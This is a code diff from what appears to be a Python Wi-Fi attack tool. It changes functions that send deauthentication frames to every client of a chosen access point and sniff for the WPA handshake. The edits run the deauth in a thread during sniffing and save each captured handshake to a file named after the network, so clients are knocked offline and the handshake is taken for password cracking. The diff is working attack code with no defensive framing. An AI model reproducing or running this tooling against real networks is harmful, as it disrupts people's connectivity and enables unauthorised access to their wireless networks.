@@ -202,8 +202,10 @@ def network_sniffer():
 
 #This function is going to deauth the clients on the specified AP
 def deauth(ap):
+    time.sleep(3)
     target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
     gateway_mac = ap.mac
+    print("Sending Deauth Frame to " + ap.mac+"...")
     # Contructing the 802.11 frame:
 
     #Params :
@@ -262,8 +264,14 @@ def grab_handshake(ap):
     os.system("iw dev "+ interface + " set channel %d" % ap.channel)
     print("Sniffing " + ap.ssid + "...")
     signal.signal(signal.SIGINT,signal_handler2)
+    #Deauth the AP in a thread
+    from threading import Thread
+    t = Thread(target=deauth,args=(ap, ))
+    t.start()
     p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
-    print("Handshake Grabbed!")
+
+    print(TGREEN + "!Handshake Grabbed!" + TWHITE)
+    t.join()
     os.system("mv ./handshake/handshake.pcap ./handshake/handshake-"+ap.ssid+".pcap")
     ap.handshake = True     # Save the fact that we have the handshake for this AP
 
